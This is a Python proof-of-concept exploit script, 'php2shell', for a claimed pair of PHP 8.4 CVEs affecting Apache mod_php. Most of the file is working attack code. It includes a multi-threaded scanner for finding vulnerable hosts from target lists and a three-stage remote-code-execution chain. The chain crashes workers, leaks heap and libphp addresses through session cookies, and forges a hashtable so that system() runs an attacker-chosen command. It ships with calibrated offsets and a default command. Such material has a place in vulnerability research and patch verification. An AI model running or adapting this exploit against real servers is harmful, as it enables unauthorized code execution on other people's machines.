#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-109618 / CVE-2026-109619 — php2shell PoC.

Modes:
  check   — passive GET fingerprint; single URL or bulk target list.
  exploit — one-shot RCE against PHP 8.4.26 + Apache mod_php prefork.

Exploit chain (pure HTTP, no target-side PHP required):
  Stage 0  Worker rotation via OOM + session init crash
  Stage 1  Set-Cookie heap leak        -> Zend MM chunk base
  Stage 2  Set-Cookie libphp leak      -> libphp base (ZVAL_PTR_DTOR)
  Stage 3  upload_progress fake-ref    -> pDestructor = zif_system -> RCE

Exploit target requirements:
  display_errors=1, memory_limit=8M, max_input_vars=1000,
  session.use_cookies=1, session.use_strict_mode=0,
  session.upload_progress.enabled=1, single-worker prefork.

Use only against systems you own or are authorized to test.
Command-line arguments are visible in process listings and shell history.
"""

# Imports
import argparse
import http.client
import json
import os
import re
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
import urllib.parse
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# Constants
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
ENDC = "\033[0m"

# Calibration: official php:8.4.26-apache (Debian 12, Apache 2.4.69)
BOOKWORM = {
    "stage1_n": 841,
    "stage2_t": 406,
    "stage2_v": 16,
    "htdata_offset": 0x690D8,
    "stage3_pads": [(31, 31)] * 6,
    "stage3_carrier": True,
}

# Calibration: lab build (Apache 2.4.68, minimal PHP)
LAB = {
    "stage1_n": 892,
    "stage2_t": 443,
    "stage2_v": 1,
    "htdata_offset": 0x6E0D8,
    "stage3_pads": [(8, 7)] + [(7, 7)] * 5,
    "stage3_carrier": False,
}

ZIF_OFFSET_DEFAULT = 0x43A870
DTOR_OFFSET_DEFAULT = 0x613C50
MAX_CMD = 14
SID = b"attacksessionid0001"
HERE = os.path.dirname(os.path.abspath(__file__))

FIX_VERSIONS = {
    "8.2": (8, 2, 35),
    "8.3": (8, 3, 36),
    "8.4": (8, 4, 27),
    "8.5": (8, 5, 12),
}


# ---- check mode (passive fingerprint) ----


def parse_php_version(text):
    if not text:
        return None, False
    m = re.search(r"PHP\s*/?\s*(\d+)\.(\d+)(?:\.(\d+))?", text, re.I)
    if not m:
        return None, False
    major, minor = int(m.group(1)), int(m.group(2))
    patch_known = m.group(3) is not None
    patch = int(m.group(3)) if patch_known else 0
    if major < 4 or major > 8:
        return None, False
    if major == 8 and minor > 5:
        return None, False
    return (major, minor, patch), patch_known


def is_vulnerable(ver, patch_known=True):
    if ver is None:
        return None
    if not patch_known:
        return None
    major, minor, patch = ver
    key = f"{major}.{minor}"
    fix = FIX_VERSIONS.get(key)
    if fix is None:
        return True if major >= 5 else False
    return ver < fix


def http_get_fingerprint(url, timeout=10.0, proxy=None):
    u = urllib.parse.urlsplit(url if "://" in url else "https://" + url)
    scheme = (u.scheme or "https").lower()
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if scheme == "https" else 80)
    path = u.path or "/"

    row = {
        "target": url, "http_status": 0, "x_powered_by": "",
        "server": "", "php_version": None, "likely_vulnerable": None,
    }

    try:
        if proxy:
            pu = urllib.parse.urlsplit(proxy)
            phost = pu.hostname or "127.0.0.1"
            pport = pu.port or 8080
            if scheme == "https":
                conn = http.client.HTTPSConnection(
                    phost, pport, timeout=timeout,
                    context=ssl._create_unverified_context(),
                )
                conn.set_tunnel(host, port)
            else:
                conn = http.client.HTTPConnection(
                    phost, pport, timeout=timeout,
                )
                path = f"http://{host}:{port}{path}"
        elif scheme == "https":
            conn = http.client.HTTPSConnection(
                host, port, timeout=timeout,
                context=ssl._create_unverified_context(),
            )
        else:
            conn = http.client.HTTPConnection(
                host, port, timeout=timeout,
            )

        conn.request("GET", path, headers={
            "Host": host,
            "User-Agent": "php2shell-check/1.0",
            "Connection": "close",
        })
        resp = conn.getresponse()
        row["http_status"] = resp.status
        row["x_powered_by"] = resp.getheader("X-Powered-By", "")
        row["server"] = resp.getheader("Server", "")
        body = resp.read(8192).decode("latin1", "replace")
        conn.close()
    except Exception as e:
        row["error"] = f"{type(e).__name__}: {e}"
        return row

    ver, patch_known = parse_php_version(row["x_powered_by"])
    source = "header"
    if ver is None:
        ver, patch_known = parse_php_version(body)
        source = "body" if ver else None

    if ver:
        major, minor, patch = ver
        row["php_version"] = (
            f"{major}.{minor}.{patch}" if patch_known
            else f"{major}.{minor}.?"
        )
        row["likely_vulnerable"] = is_vulnerable(ver, patch_known)
        row["version_source"] = source

    return row


def classify_check(fp):
    if not fp.get("http_status"):
        return "unreachable"
    if not fp.get("php_version"):
        return "no_php_version"
    lv = fp.get("likely_vulnerable")
    if lv is True:
        return "likely_vulnerable"
    if lv is False:
        return "patched"
    return "unknown_patch"


def platform_guard(fp):
    """Decline reason if a fingerprint shows an unsupported target, else None.

    The exploit needs Apache mod_php prefork on Linux. Positive evidence of
    Windows, IIS, or a non-mod_php SAPI is a decline; a stripped or absent
    Server token is inconclusive and never blocks.
    """
    server = (fp.get("server") or "").lower()
    xpb = (fp.get("x_powered_by") or "").lower()
    shown = fp.get("server") or "(none)"
    if "microsoft-iis" in server or "asp.net" in xpb:
        return f"IIS/ASP.NET target (Server: {shown}); needs Apache mod_php prefork on Linux"
    if "win32" in server or "win64" in server:
        return f"Windows Apache build (Server: {shown}); exploit is Linux-only"
    if "nginx" in server:
        return f"nginx target (Server: {shown}); PHP runs as FPM/FastCGI, not mod_php prefork"
    return None


def load_targets(path):
    lines = Path(path).read_text(encoding="utf-8", errors="replace").splitlines()
    out = []
    skip = {"domain", "host", "url", "target"}
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split(",")[0].split()[0].strip()
        if token.lower() in skip:
            continue
        url = token if "://" in token else "https://" + token
        out.append(url)
    seen = set()
    return [u for u in out if not (u in seen or seen.add(u))]


def run_check(args):
    targets = []
    if args.file:
        targets.extend(load_targets(args.file))
    if args.url:
        url = args.url if "://" in args.url else "https://" + args.url
        targets.append(url)
    if not targets:
        print(f"{RED}[-] provide URL or -f/--file{ENDC}", file=sys.stderr)
        return 2

    seen = set()
    targets = [u for u in targets if not (u in seen or seen.add(u))]
    total = len(targets)
    workers = min(args.workers, total)
    rows = []
    out_path = Path(args.output) if args.output else None
    if out_path:
        out_path.write_text("", encoding="utf-8")

    proxy = getattr(args, "proxy", None)

    def _one(url):
        return http_get_fingerprint(url, timeout=args.timeout, proxy=proxy)

    def _report(fp, n):
        st = classify_check(fp)
        fp["status"] = st
        ver = fp.get("php_version") or "?"
        host = fp.get("target", "?")
        if st == "likely_vulnerable":
            tag = f"{RED}[VULNERABLE]{ENDC}"
        elif st == "patched":
            tag = f"{GREEN}[PATCHED]{ENDC}"
        elif st == "unreachable":
            tag = f"{RED}[UNREACHABLE]{ENDC}"
        else:
            tag = f"{YELLOW}[{st.upper()}]{ENDC}"
        if not args.quiet:
            prefix = f"[{n}/{total}] " if total > 1 else ""
            print(f"{prefix}{tag} {host}  PHP {ver}", flush=True)
        if out_path:
            with open(out_path, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(fp, default=str) + "\n")

    if workers <= 1:
        for i, url in enumerate(targets):
            fp = _one(url)
            rows.append(fp)
            _report(fp, i + 1)
    else:
        idx = {url: i for i, url in enumerate(targets)}
        done = 0
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futs = {pool.submit(_one, url): url for url in targets}
            for fut in as_completed(futs):
                fp = fut.result()
                rows.append(fp)
                done += 1
                _report(fp, done)

    if args.json:
        print(json.dumps(rows if len(rows) > 1 else rows[0], indent=2,
                         default=str))

    if not args.quiet and total > 1:
        counts = {}
        for r in rows:
            k = r.get("status", "?")
            counts[k] = counts.get(k, 0) + 1
        parts = ", ".join(f"{k}={v}" for k, v in sorted(counts.items()))
        print(f"\n{YELLOW}Summary ({total} targets): {parts}{ENDC}")

    if not args.quiet and total == 1:
        fp = rows[0]
        if fp.get("x_powered_by"):
            print(f"  X-Powered-By: {fp['x_powered_by']}")
        if fp.get("server"):
            print(f"  Server: {fp['server']}")
        fixes = ", ".join(
            f"{k} -> {'.'.join(map(str, v))}"
            for k, v in FIX_VERSIONS.items()
        )
        print(f"  Fix versions: {fixes}")
        print(f"  Mitigation: session.upload_progress.enabled = Off")

    vuln = any(r.get("likely_vulnerable") for r in rows)
    return 2 if vuln else 0


def build_multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def read_offsets_file(path):
    vals = {}
    if not path:
        return vals
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, val = line.split("=", 1)
                vals[key.strip()] = int(val.strip(), 0)
    except (OSError, ValueError):
        pass
    return vals


class Target:

    def __init__(self, url, timeout=30.0, verbose=True):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise ValueError("URL must be http:// or https://")
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        self.timeout = timeout
        self.verbose = verbose

    def log(self, msg):
        if self.verbose:
            print(msg, flush=True)

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = socket.create_connection(
                    (self.host, self.port), timeout=self.timeout
                )
                if self.https:
                    ctx = ssl.create_default_context()
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last

    def post(self, body, boundary, read_cap=1 << 20, timeout=None,
             extra_headers=None):
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)

        data = bytearray()

        def _reader():
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass
            reader.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()

    def get(self, path, read_cap=1 << 20):
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


def parse_cookie(resp):
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw):
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw, dtor_offset):
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


class Exploit:

    def __init__(self, target, cmd, zif_offset, dtor_offset, htdata_offset,
                 huge_mb=12, verbose=True, profile="bookworm"):
        self.t = target
        self.cmd = cmd.encode() if isinstance(cmd, str) else cmd
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_mb = huge_mb
        self.verbose = verbose
        self.profile = profile
        cal = BOOKWORM if profile == "bookworm" else LAB
        self.stage1_n = cal["stage1_n"]
        self.stage2_t = cal["stage2_t"]
        self.stage2_v = cal["stage2_v"]
        self.stage3_pads = list(cal["stage3_pads"])
        self.stage3_carrier = cal["stage3_carrier"]

    def _big_field(self):
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self):
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self):
        self.t.log(f"{YELLOW}[*] rotating worker{ENDC}")
        parts = [
            {"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)
        ]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(
            build_multipart(parts, b"S" * 17), b"S" * 17,
            read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
        )
        time.sleep(0.3)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(
            build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
            read_cap=65536, timeout=20.0,
        )
        time.sleep(0.5)

    def stage1(self):
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(
            build_multipart(parts, b"S" * 17), b"S" * 17,
            read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
        )
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_n):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        resp = self.t.post(
            build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20,
        )
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self):
        parts = [
            {"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)
        ]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(
            build_multipart(parts, b"S" * 17), b"S" * 17,
            read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
        )
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append(
                    {"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v}
                )

        resp = self.t.post(
            build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20,
        )
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)

    def _fake_payload(self, htdata, zif):
        cmd = self.cmd
        if len(cmd) > MAX_CMD:
            raise ValueError(
                f"command is {len(cmd)} bytes; max {MAX_CMD} "
                "(use 'sh</out/c' indirection for longer commands)"
            )
        ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)
        struct.pack_into("<Q", ht, E + 0x08, 0)
        struct.pack_into("<Q", ht, E + 0x10, zif)
        struct.pack_into("<Q", ht, E + 0x18, 0)
        struct.pack_into("<Q", ht, E + 0x20, 0)
        struct.pack_into("<I", ht, E + 0x28, 0)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x30, 0)
        struct.pack_into("<Q", ht, E + 0x38, 0)
        struct.pack_into("<I", ht, E + 0x40, 0)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x88, 0)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata, zif):
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nl, vl) in enumerate(self.stage3_pads):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = None
        if self.profile == "bookworm":
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(
            build_multipart(parts, b"S" * 17), b"S" * 17,
            read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
            extra_headers=extra,
        )
        time.sleep(0.3)

        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            carrier = (
                struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            )
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(
            build_multipart(parts, b"B" * 10), b"B" * 10,
            read_cap=65536, timeout=30.0,
        )


def auto_offsets(container, offsets_path, quiet):
    helper = os.path.join(HERE, "docker", "offsets.py")
    if not os.path.exists(helper):
        return {}
    if not quiet:
        print(
            f"{YELLOW}[*] reading libphp offsets from container "
            f"{container}{ENDC}",
            flush=True,
        )
    try:
        subprocess.run(
            [sys.executable, helper, container, offsets_path],
            check=False, timeout=60,
            stdout=None if not quiet else subprocess.DEVNULL,
            stderr=None if not quiet else subprocess.DEVNULL,
        )
    except (OSError, subprocess.SubprocessError):
        pass
    return read_offsets_file(offsets_path)


def run_exploit(args):
    default_proof = os.path.join(HERE, "out", "p1")
    default_offsets = os.path.join(HERE, "out", "offsets.env")
    default_cmd_file = os.path.join(HERE, "out", "c")

    if not args.url:
        print(f"{RED}[-] exploit mode requires -u/--url{ENDC}", file=sys.stderr)
        return 2

    cal = BOOKWORM if args.profile == "bookworm" else LAB
    if args.htdata_offset is None:
        args.htdata_offset = cal["htdata_offset"]

    offsets_file = args.offsets_file if args.offsets_file else default_offsets
    local_offsets = read_offsets_file(offsets_file)
    t = Target(args.url, timeout=args.timeout, verbose=not args.quiet)

    if not args.no_preflight:
        fp = http_get_fingerprint(args.url, timeout=args.timeout)
        reason = platform_guard(fp)
        if reason and not args.force:
            print(f"{RED}[-] unsupported target: {reason}{ENDC}", file=sys.stderr)
            print(f"{RED}[-] re-run with --force to override{ENDC}", file=sys.stderr)
            return 2
        if reason:
            t.log(f"{YELLOW}[*] preflight: {reason} — continuing (--force){ENDC}")
        elif fp.get("server"):
            t.log(f"[*] preflight: Server: {fp.get('server')} (supported)")
        ver = fp.get("php_version")
        if ver and fp.get("likely_vulnerable") is False:
            t.log(
                f"{YELLOW}[*] preflight: target reports PHP {ver} (patched); "
                f"exploit will likely fail{ENDC}"
            )
        elif ver:
            t.log(f"[*] preflight: target reports PHP {ver}")

    if (not local_offsets and not args.no_auto_offsets and offsets_file
            and t.host in ("127.0.0.1", "localhost", "::1")):
        local_offsets = auto_offsets(
            args.docker_container, offsets_file, args.quiet,
        )

    if args.zif_offset is None:
        args.zif_offset = local_offsets.get("ZIF_OFFSET", ZIF_OFFSET_DEFAULT)
    if args.dtor_offset is None:
        args.dtor_offset = local_offsets.get("DTOR_OFFSET", DTOR_OFFSET_DEFAULT)

    proof_file = args.proof_file if args.proof_file else default_proof
    cmd = args.cmd
    if len(cmd.encode()) > MAX_CMD:
        os.makedirs(os.path.dirname(default_cmd_file), exist_ok=True)
        full_cmd = f"exec >/out/p1 2>&1\n{cmd}"
        with open(default_cmd_file, "w", encoding="utf-8") as f:
            f.write(full_cmd + "\n")
        t.log(
            f"{YELLOW}[*] command ({len(cmd)} bytes) exceeds "
            f"{MAX_CMD}-byte limit{ENDC}"
        )
        t.log(f"{YELLOW}[*] wrote to {default_cmd_file}{ENDC}")
        cmd = "sh</out/c"

    ex = Exploit(
        t, cmd, zif_offset=args.zif_offset, dtor_offset=args.dtor_offset,
        htdata_offset=args.htdata_offset, huge_mb=args.huge_mb,
        verbose=not args.quiet, profile=args.profile,
    )

    t.log(f"[*] target {args.url}")
    t.log(f"[*] cmd={cmd!r} (original: {args.cmd!r})")
    if local_offsets:
        t.log(f"[*] offsets from {offsets_file}")
    t.log(
        f"[*] zif=0x{args.zif_offset:x}  dtor=0x{args.dtor_offset:x}  "
        f"htdata=0x{args.htdata_offset:x}"
    )

    def rotate_after_failure():
        if not args.no_retry_rotate:
            ex.rotate()

    if not args.no_pre_rotate:
        ex.rotate()

    # Stage 1: heap leak
    chunk = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] stage 1: heap leak ({attempt}/{args.retries})")
        chunk = ex.stage1()
        if chunk:
            t.log(f"{GREEN}[+] chunk base = 0x{chunk:x}{ENDC}")
            break
        t.log(f"{RED}[-] heap leak missed{ENDC}")
        rotate_after_failure()
    if not chunk:
        print(f"{RED}[-] HEAP_LEAK_FAILED{ENDC}", file=sys.stderr)
        return 1
    ex.rotate()

    # Stage 2: libphp leak
    libphp = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] stage 2: libphp leak ({attempt}/{args.retries})")
        libphp = ex.stage2()
        if libphp:
            t.log(f"{GREEN}[+] libphp base = 0x{libphp:x}{ENDC}")
            break
        t.log(f"{RED}[-] libphp leak missed{ENDC}")
        rotate_after_failure()
    if not libphp:
        print(f"{RED}[-] LIBPHP_LEAK_FAILED{ENDC}", file=sys.stderr)
        return 1
    ex.rotate()

    # Stage 3: RCE
    htdata = chunk + args.htdata_offset
    zif = libphp + args.zif_offset
    t.log(f"[*] stage 3: htdata=0x{htdata:x}  zif=0x{zif:x}")

    proof = ""
    if proof_file:
        try:
            if os.path.exists(proof_file):
                os.unlink(proof_file)
        except OSError:
            pass

    for attempt in range(1, args.retries + 3):
        try:
            ex.stage3(htdata, zif)
        except OSError as e:
            t.log(f"{RED}[-] request error: {e}{ENDC}")
        time.sleep(0.8)

        if proof_file:
            try:
                if os.path.exists(proof_file):
                    with open(proof_file, "rb") as f:
                        proof = f.read().decode("latin1").strip()
            except OSError:
                pass
        if not proof and args.fetch:
            status, body = t.get(args.fetch)
            if status == 200:
                proof = body.decode("latin1").strip()
        if proof:
            t.log(f"{GREEN}[+] stage 3 attempt {attempt} succeeded{ENDC}")
            print(f"\n{GREEN}PROOF:{ENDC}\n{proof}")
            return 0
        t.log(f"{YELLOW}[-] stage 3 attempt {attempt}, no proof yet{ENDC}")
        rotate_after_failure()

    print(
        f"{RED}[-] EXPLOIT_FAILED (command may have executed blind){ENDC}",
        file=sys.stderr,
    )
    return 1


def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109618 / CVE-2026-109619 PoC (php2shell)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  %(prog)s check https://example.com/
  %(prog)s check -f targets.txt -o results.jsonl --workers 8
  %(prog)s exploit -u http://127.0.0.1:8088/index.php
  %(prog)s exploit -u http://127.0.0.1:8088/index.php -c 'id>/out/p1'
""",
    )
    ap.add_argument(
        "mode", choices=("check", "exploit"), nargs="?", default="exploit",
        help="check = passive GET fingerprint; exploit = RCE (default)",
    )
    ap.add_argument("-u", "--url", default=None, help="Target URL")
    ap.add_argument(
        "-f", "--file", default=None,
        help="Target list (one URL per line, # comments ok)",
    )
    ap.add_argument(
        "-p", "--proxy", default=None,
        help="HTTP proxy for check mode (e.g. http://127.0.0.1:8080)",
    )
    ap.add_argument(
        "-o", "--output", default=None,
        help="Output file (JSONL for bulk, JSON for single)",
    )
    ap.add_argument("--json", action="store_true", help="Print JSON to stdout")
    ap.add_argument(
        "--workers", type=int, default=8,
        help="Parallel workers for bulk check (default: 8)",
    )
    ap.add_argument(
        "-c", "--cmd", default="id;hostname -I;hostname",
        help="Exploit: command to run (>%d bytes auto-uses sh indirection)" % MAX_CMD,
    )
    ap.add_argument("--proof-file", default=None, help="Exploit: proof file path")
    ap.add_argument("--fetch", default="", help="Exploit: GET path for proof")
    ap.add_argument(
        "--profile", choices=("bookworm", "lab"), default="bookworm",
        help="Exploit: target build profile (default: bookworm)",
    )
    ap.add_argument(
        "--zif-offset", type=lambda x: int(x, 0), default=None,
        help="Exploit: zif_system offset in libphp.so",
    )
    ap.add_argument(
        "--dtor-offset", type=lambda x: int(x, 0), default=None,
        help="Exploit: ZVAL_PTR_DTOR offset in libphp.so",
    )
    ap.add_argument(
        "--htdata-offset", type=lambda x: int(x, 0), default=None,
        help="Exploit: chunk-relative htdata offset",
    )
    ap.add_argument("--offsets-file", default=None, help="Exploit: offsets env file")
    ap.add_argument(
        "--docker-container", default="php2shell-target",
        help="Exploit: container for auto offset derivation",
    )
    ap.add_argument("--no-auto-offsets", action="store_true")
    ap.add_argument("--huge-mb", type=int, default=12)
    ap.add_argument("-t", "--timeout", type=float, default=10.0)
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--no-pre-rotate", action="store_true")
    ap.add_argument("--no-retry-rotate", action="store_true")
    ap.add_argument(
        "--no-preflight", action="store_true",
        help="Exploit: skip the Server-header platform check",
    )
    ap.add_argument(
        "--force", action="store_true",
        help="Exploit: run even if the target looks unsupported",
    )
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    if args.mode == "check":
        return run_check(args)
    return run_exploit(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
